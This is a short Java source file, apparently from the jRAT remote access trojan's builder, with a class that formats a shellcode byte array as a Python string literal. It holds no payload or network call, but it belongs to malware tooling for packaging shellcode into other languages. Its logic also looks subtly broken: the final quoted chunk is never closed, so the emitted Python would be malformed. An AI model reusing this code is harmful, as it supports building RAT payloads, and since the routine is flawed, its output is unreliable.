package io.jrat.controller.build.shellcode;

import io.jrat.controller.utils.ShellcodeUtils;

public class Python implements Shellcode {

	@Override
	public String generate(String arrayName, byte[] array) throws Exception {
		StringBuilder builder = new StringBuilder();

		builder.append(arrayName + " = \\" + ShellcodeUtils.LINE_SEPARATOR);

		int count = 0;
		for (int i = 0; i < array.length; i++) {
			byte b = array[i];

			count++;

			if (count == 1) {
				builder.append("'");
			}

			if (i == array.length - 1) {
				builder.append(ShellcodeUtils.getPythonByte(b));
			} else {
				builder.append(ShellcodeUtils.getPythonByte(b));
				if (count >= 16) {
					count = 0;
					builder.append("' + \\" + ShellcodeUtils.LINE_SEPARATOR);
				}
			}
		}

		builder.append(ShellcodeUtils.LINE_SEPARATOR + "\\");

		return builder.toString();
	}

}
